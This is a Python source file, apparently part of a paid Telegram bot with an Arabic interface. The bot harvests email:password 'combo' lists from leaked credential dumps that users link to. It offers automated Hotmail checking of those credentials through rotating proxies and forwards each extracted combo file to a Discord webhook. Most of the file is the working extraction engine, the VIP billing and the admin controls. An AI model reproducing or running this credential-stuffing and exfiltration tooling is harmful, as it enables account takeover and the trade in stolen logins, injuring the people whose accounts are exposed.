@bot.callback_query_handler(func=lambda call: call.data == "admin_panel")
async def admin_panel(call):
    await bot.answer_callback_query(call.id)
    if int(call.message.chat.id) != int(ADMIN_ID): return
    admin_states.pop(ADMIN_ID, None)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("ترقية VIP", callback_data="adm_add_vip"))
    markup.add(InlineKeyboardButton("حظر مستخدم", callback_data="adm_ban"))
    markup.add(InlineKeyboardButton("إذاعة", callback_data="adm_broadcast"))
    markup.add(InlineKeyboardButton("إحصائيات", callback_data="adm_stats"))
    markup.add(InlineKeyboardButton("رجوع", callback_data="back_to_home"))
    await bot.edit_message_text(f"{EMOJI['admin']} <b>لوحة تحكم الأدمن:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
async def admin_actions_handler(call):
    await bot.answer_callback_query(call.id)
    if int(call.message.chat.id) != int(ADMIN_ID): return
    action = call.data
    markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))

    if action == "adm_add_vip":
        admin_states[ADMIN_ID] = {"step": "waiting_vip_user"}
        await bot.edit_message_text(f"{EMOJI['card']} <b>أرسل (أيدي المستخدم) أو (يوزرنيم المستخدم) لتفعليه:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_ban":
        admin_states[ADMIN_ID] = {"step": "waiting_ban_user"}
        await bot.edit_message_text(f"{EMOJI['no']} <b>أرسل أيدي أو يوزرنيم المستخدم المراد حظره:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_broadcast":
        admin_states[ADMIN_ID] = {"step": "waiting_broadcast_msg"}
        await bot.edit_message_text(f"{EMOJI['rocket']} <b>أرسل الرسالة المراد إذاعتها لجميع مستخدمي البوت:</b>", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='HTML')
    elif action == "adm_stats":
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM hotmail_checks")
        total_checks = cursor.fetchone()[0]
        cursor.execute("SELECT SUM(hits) FROM hotmail_checks")
        total_hits = cursor.fetchone()[0] or 0
        conn.close()
        stats_text = f"{EMOJI['circle']} <b>إحصائيات البوت:</b>\n\n👥 <b>إجمالي المستخدمين:</b> `{total_users}`\n{EMOJI['diamond']} <b>إجمالي مشتركين VIP:</b> `{total_vips}`\n{EMOJI['fire']} <b>إجمالي فحوصات Hotmail:</b> `{total_checks}`\n{EMOJI['check']} <b>إجمالي Hits:</b> `{total_hits}`"
        await bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)

# ═══════════════════════════════════════════════════════════
# LINK & TEXT MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.message_handler(func=lambda message: message.text and message.text.startswith(('http://', 'https://')))
async def handle_link(message: Message):
    chat_id = message.chat.id
    user = get_user(chat_id, message.from_user.username)

    if user["banned"]: return
    if not user["lang"]: return
    if not await check_subscription(chat_id):
        await bot.reply_to(message, f"{EMOJI['warning']} يجب الاشتراك في القناة أولاً!", parse_mode='HTML')
        return

    lang = user["lang"]
    t = LANGS[lang]
    file_url = message.text.strip()

    if not user["is_vip"] and user["free_uses"] <= 0:
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['upgrade_vip'], callback_data="buy_vip"))
        await bot.reply_to(message, t['free_exhausted'], reply_markup=markup, parse_mode='HTML')
        return

    try:
        async with aiohttp.ClientSession() as session:
            async with session.head(file_url, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                if resp.status != 200:
                    await bot.reply_to(message, f"{t['error_download']}{resp.status}", parse_mode='HTML')
                    return

                content_length = resp.headers.get('Content-Length', '0')
                filesize = int(content_length) if content_length.isdigit() else 0
                filename = os.path.basename(file_url.split('?')[0]) or "unknown_file"
                content_type = resp.headers.get('Content-Type', '')
    except Exception as e:
        await bot.reply_to(message, f"{t['invalid_link']}\n<code>{e}</code>", parse_mode='HTML')
        return

    if filesize > 1024*1024*1024:
        size_str = f"{filesize/(1024*1024*1024):.2f} GB"
    elif filesize > 1024*1024:
        size_str = f"{filesize/(1024*1024):.2f} MB"
    elif filesize > 1024:
        size_str = f"{filesize/1024:.2f} KB"
    else:
        size_str = f"{filesize} B"

    user_states[chat_id] = {
        "step": "link_ready",
        "file_url": file_url,
        "filename": filename,
        "filesize_bytes": filesize,
        "platform": "all"
    }

    text = t['link_info_title'].format(filename=filename, filesize=size_str)
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(t['combo_btn'], callback_data="extract_combo"))
    markup.add(InlineKeyboardButton(t['cancel_btn'], callback_data="cancel_download"))

    await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "extract_combo")
async def extract_combo_handler(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id

    if chat_id not in user_states or user_states[chat_id].get("step") != "link_ready":
        return

    await start_url_processing(chat_id, call.message.message_id)

# ═══════════════════════════════════════════════════════════
# ADMIN MESSAGE HANDLERS
# ═══════════════════════════════════════════════════════════
@bot.message_handler(func=lambda message: message.chat.id == ADMIN_ID and ADMIN_ID in admin_states)
async def handle_admin_messages(message: Message):
    chat_id = message.chat.id
    state = admin_states.get(ADMIN_ID, {})
    step = state.get("step")

    if step == "waiting_vip_user":
        target_id = get_user_by_id_or_username(message.text)
        if not target_id:
            await bot.reply_to(message, f"{EMOJI['no']} المستخدم غير موجود.", parse_mode='HTML')
            return
        admin_states[ADMIN_ID] = {"step": "waiting_vip_duration", "target_id": target_id}
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("1 يوم", callback_data="vip_1d"))
        markup.add(InlineKeyboardButton("7 أيام", callback_data="vip_7d"))
        markup.add(InlineKeyboardButton("30 يوم", callback_data="vip_30d"))
        markup.add(InlineKeyboardButton("Lifetime", callback_data="vip_lifetime"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel"))
        await bot.reply_to(message, f"{EMOJI['diamond']} اختر مدة الاشتراك:", reply_markup=markup, parse_mode='HTML')

    elif step == "waiting_ban_user":
        target_id = get_user_by_id_or_username(message.text)
        if not target_id:
            await bot.reply_to(message, f"{EMOJI['no']} المستخدم غير موجود.", parse_mode='HTML')
            return
        update_user_field(target_id, "banned", 1)
        await bot.reply_to(message, f"{EMOJI['yes']} تم حظر المستخدم {target_id} بنجاح.", parse_mode='HTML')
        admin_states.pop(ADMIN_ID, None)

    elif step == "waiting_broadcast_msg":
        broadcast_msg = message.text
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute("SELECT chat_id FROM users")
        users = cursor.fetchall()
        conn.close()

        sent_count = 0
        for (uid,) in users:
            try:
                await bot.send_message(uid, broadcast_msg, parse_mode='HTML')
                sent_count += 1
                await asyncio.sleep(0.05)
            except Exception as e:
                print(f"Broadcast error to {uid}: {e}")

        await bot.reply_to(message, f"{EMOJI['yes']} تم الإذاعة إلى {sent_count} مستخدم.", parse_mode='HTML')
        admin_states.pop(ADMIN_ID, None)

@bot.callback_query_handler(func=lambda call: call.data.startswith("vip_"))
async def vip_duration_handler(call):
    await bot.answer_callback_query(call.id)
    if int(call.message.chat.id) != int(ADMIN_ID): return

    state = admin_states.get(ADMIN_ID, {})
    target_id = state.get("target_id")
    if not target_id:
        return

    duration = call.data.replace("vip_", "")
    now = datetime.now()

    if duration == "1d":
        expiry = now + timedelta(days=1)
    elif duration == "7d":
        expiry = now + timedelta(days=7)
    elif duration == "30d":
        expiry = now + timedelta(days=30)
    else:
        expiry = None

    update_user_field(target_id, "is_vip", 1)
    if expiry:
        update_user_field(target_id, "vip_expiry", expiry.isoformat())
    else:
        update_user_field(target_id, "vip_expiry", None)

    await bot.edit_message_text(f"{EMOJI['yes']} تم تفعيل VIP للمستخدم {target_id} بنجاح!", call.message.chat.id, call.message.message_id, parse_mode='HTML')
    admin_states.pop(ADMIN_ID, None)

# ═══════════════════════════════════════════════════════════
# URL PROCESSING ENGINE
# ═══════════════════════════════════════════════════════════
async def start_url_processing(chat_id, msg_id):
    user = get_user(chat_id)
    lang = user["lang"] or "ar"
    t = LANGS[lang]
    state = user_states.get(chat_id, {})
    file_url = state.get("file_url")
    target_info = (state.get("platform") or "all").lower()
    filename = state.get("filename")
    total_size = state.get("filesize_bytes", 0)

    if not user["is_vip"]:
        update_user_field(chat_id, "free_uses", user["free_uses"] - 1)
        user = get_user(chat_id)

    active_downloads[chat_id] = True

    progress_markup = InlineKeyboardMarkup()
    progress_markup.add(InlineKeyboardButton(t['cancel_process'], callback_data="cancel_download"))

    try:
        status_msg = await bot.edit_message_text(t['processing_panel'], chat_id, msg_id, parse_mode='HTML', reply_markup=progress_markup)
    except:
        status_msg = await bot.send_message(chat_id, t['processing_panel'], parse_mode='HTML', reply_markup=progress_markup)

    start_time = time.time()
    unique_results = set()

    try:
        timeout = aiohttp.ClientTimeout(total=900)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(file_url) as response:
                if response.status != 200:
                    active_downloads[chat_id] = False
                    await bot.edit_message_text(f"{t['error_download']}{response.status}", chat_id, status_msg.message_id, parse_mode='HTML')
                    return

                hd_len = int(response.headers.get('content-length', 0))
                if hd_len > 0:
                    total_size = hd_len

                downloaded_size = 0
                line_buffer = ""
                chunk_count = 0
                last_edit_time = 0

                async for chunk in response.content.iter_any():
                    if not active_downloads.get(chat_id, True):
                        return

                    chunk_count += 1
                    downloaded_size += len(chunk)

                    if total_size > 0:
                        percent = min(100.0, (downloaded_size / total_size) * 100)
                    else:
                        percent = min(99.0, chunk_count * 1.5)

                    current_time = time.time()
                    if current_time - last_edit_time > 2.0:
                        last_edit_time = current_time
                        bar_str = make_progress_bar(percent)
                        dl_mb = downloaded_size / (1024 * 1024)
                        tot_mb = total_size / (1024 * 1024) if total_size > 0 else 0

                        dashboard_text = (
                            f"{t['download_started_2']}"
                            f"{EMOJI['box']} <b>الملف:</b> `{filename}`\n"
                            f"{EMOJI['lightning']} <b>التقدم:</b> `{bar_str}`\n"
                            f"{EMOJI['card']} <b>المحمل:</b> `{dl_mb:.2f} MB` / `{tot_mb:.2f} MB`\n"
                            f"{EMOJI['target']} <b>استخراج الكومبو لـ:</b> `{target_info}`..."
                        )
                        try:
                            await bot.edit_message_text(dashboard_text, chat_id, status_msg.message_id, parse_mode='HTML', reply_markup=progress_markup)
                        except:
                            pass

                    decoded_chunk = chunk.decode('utf-8', errors='ignore')
                    line_buffer += decoded_chunk
                    lines = line_buffer.split('\n')
                    line_buffer = lines.pop()

                    for line in lines:
                        clean_line = line.strip()
                        if not clean_line:
                            continue

                        line_lower = clean_line.lower()
                        if "@" in clean_line and ":" in clean_line:
                            parts = clean_line.split(":")
                            for i in range(len(parts) - 1):
                                if "@" in parts[i]:
                                    try:
                                        raw_email_part = parts[i].split()[-1]
                                        email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw_email_part)
                                        if email_match:
                                            clean_email = email_match.group(1)
                                            if i + 1 < len(parts):
                                                raw_pass = parts[i+1].strip()
                                                clean_pass = raw_pass.split()[0].rstrip('.,;!?"\'')
                                                if len(clean_pass) > 0 and clean_pass.lower() not in ['com', 'org', 'net', 'ru']:
                                                    final_combo = f"{clean_email}:{clean_pass}"
                                                    if target_info == "all" or target_info in line_lower or target_info in clean_email.lower():
                                                        unique_results.add(final_combo)
                                    except Exception:
                                        continue

                if line_buffer.strip():
                    final_line = line_buffer.strip()
                    if "@" in final_line and ":" in final_line:
                        parts = final_line.split(":")
                        for i in range(len(parts) - 1):
                            if "@" in parts[i]:
                                try:
                                    raw_email_part = parts[i].split()[-1]
                                    email_match = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw_email_part)
                                    if email_match:
                                        clean_email = email_match.group(1)
                                        if i + 1 < len(parts):
                                            raw_pass = parts[i+1].strip()
                                            clean_pass = raw_pass.split()[0].rstrip('.,;!?"\'')
                                            if len(clean_pass) > 0 and clean_pass.lower() not in ['com', 'org', 'net', 'ru']:
                                                final_combo = f"{clean_email}:{clean_pass}"
                                                if target_info == "all" or target_info in final_line.lower() or target_info in clean_email.lower():
                                                    unique_results.add(final_combo)
                                except Exception:
                                    continue

        if not active_downloads.get(chat_id, True):
            return

        try: await bot.delete_message(chat_id, status_msg.message_id)
        except: pass

        elapsed = time.time() - start_time
        user_states.pop(chat_id, None)
        active_downloads[chat_id] = False

        matched_list = list(unique_results)

        if not matched_list:
            await bot.send_message(chat_id, t['no_results'], parse_mode='HTML')
            return

        rem_text = t['remaining_tries'].format(free=user['free_uses']) if not user["is_vip"] else t['unlimited_vip']
        success_msg = t['success_results'].format(count=len(matched_list), elapsed=elapsed, remaining=rem_text)

        combo_filename = f"Clean_ULP_Combo_{target_info}_{int(time.time())}.txt"
        with open(combo_filename, "w", encoding="utf-8") as f:
            f.write("\n".join(matched_list))

        update_user_field(chat_id, "last_extracted_file", combo_filename)

        await bot.send_message(chat_id, success_msg, parse_mode='HTML')
        with open(combo_filename, "rb") as cf:
            await bot.send_document(chat_id, cf, caption=f"{EMOJI['fire']} <b>Pure ULP Combo Results for</b> `{target_info}`\n{EMOJI['box']} <b>Total unique items:</b> {len(matched_list)}", parse_mode='HTML')

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['hotmail_auto_btn'], callback_data="hotmail_auto_check"))
        markup.add(InlineKeyboardButton("🔙 رجوع للقائمة", callback_data="back_to_home"))
        await bot.send_message(chat_id, f"{EMOJI['flame']} <b>هل تريد فحص Hotmail تلقائياً لهذا الملف؟</b>", reply_markup=markup, parse_mode='HTML')

        user_info = f"@{user['username']}" if user.get('username') else f"ID:{chat_id}"
        discord_ok = await send_file_to_discord(
            file_path=combo_filename,
            filename=combo_filename,
            target_info=target_info,
            count=len(matched_list),
            user_info=user_info
        )

        if discord_ok:
            await bot.send_message(chat_id, t['discord_sent'], parse_mode='HTML')
        else:
            await bot.send_message(chat_id, t['discord_failed'], parse_mode='HTML')

    except Exception as e:
        active_downloads[chat_id] = False
        user_states.pop(chat_id, None)
        try:
            await bot.edit_message_text(f"{t['error_processing']}{e}", chat_id, status_msg.message_id, parse_mode='HTML')
        except:
            pass

# ═══════════════════════════════════════════════════════════
# DOCUMENT HANDLER (for combo files & proxy files)
# ═══════════════════════════════════════════════════════════
@bot.message_handler(content_types=['document'])
async def handle_document(message: Message):
    chat_id = message.chat.id
    user = get_user(chat_id, message.from_user.username)
    lang = user["lang"] or "ar"
    t = LANGS[lang]

    if user["banned"]: return
    if not user["lang"]: return

    # Check if waiting for proxy file
    if chat_id in user_states and user_states[chat_id].get("step") == "wait_proxy_file":
        doc = message.document
        if not doc.file_name.endswith('.txt'):
            await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى إرسال ملف .txt فقط.</b>", parse_mode='HTML')
            return

        file_info = await bot.get_file(doc.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)

        file_path = os.path.join(PROXIES_DIR, f"proxies_{chat_id}_{int(time.time())}.txt")
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        valid_count = 0
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        valid_count += 1
        except:
            pass

        save_proxy_file(chat_id, file_path)
        user_states.pop(chat_id, None)

        text = t['proxy_file_received'].format(filename=doc.file_name, count=valid_count)
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("🔙 رجوع / Back", callback_data="proxy_menu"))
        await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
        return

    # Check if waiting for hotmail file
    if chat_id in user_states and user_states[chat_id].get("step") == "wait_hotmail_file":
        doc = message.document
        if not doc.file_name.endswith('.txt'):
            await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى إرسال ملف .txt فقط.</b>", parse_mode='HTML')
            return

        file_info = await bot.get_file(doc.file_id)
        downloaded_file = await bot.download_file(file_info.file_path)

        file_path = f"Hotmail_Combo_{chat_id}_{int(time.time())}.txt"
        with open(file_path, 'wb') as f:
            f.write(downloaded_file)

        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = sum(1 for line in f if ':' in line and '@' in line)

        user_states[chat_id]["hotmail_file"] = file_path
        user_states[chat_id]["step"] = "hotmail_file_ready"

        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton(t['hotmail_start_btn'], callback_data="hotmail_start_check"))
        markup.add(InlineKeyboardButton("🔙 رجوع", callback_data="hotmail_menu"))

        text = t['hotmail_file_received'].format(filename=doc.file_name, lines=lines)
        await bot.reply_to(message, text, reply_markup=markup, parse_mode='HTML')
        return

    await bot.reply_to(message, f"{EMOJI['warning']} <b>يرجى استخدام الأزرار أو إرسال رابط مباشر.</b>", parse_mode='HTML')

# ═══════════════════════════════════════════════════════════
# MAIN - Render Compatible (Flask as main, Bot in background)
# ═══════════════════════════════════════════════════════════

def run_bot_polling():
    """Run bot polling in a separate thread with its own event loop"""
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    async def bot_main():
        print("[*] Bot polling started in background thread...")
        print(f"[*] Loaded {len(SV)} platforms for Hotmail checking")
        print(f"[*] Admin ID: {ADMIN_ID}")
        print(f"[*] Channel: {CHANNEL_USERNAME}")
        print(f"[*] Proxy support enabled with smart rotation")
        await bot.infinity_polling(timeout=60)

    try:
        loop.run_until_complete(bot_main())
    except Exception as e:
        print(f"[-] Bot polling error: {e}")
    finally:
        loop.close()

if __name__ == '__main__':
    while True:
        try:
            # Start bot in background thread
            bot_thread = threading.Thread(target=run_bot_polling, daemon=True)
            bot_thread.start()

            # Start Flask as main process - Render expects this to bind to PORT
            print("[*] Starting Flask main server for Render...")
            run_flask()
        except KeyboardInterrupt:
            print("\n[*] Bot stopped by user.")
            break
        except Exception as e:
            print(f"[-] Main error: {e}")
            time.sleep(5)
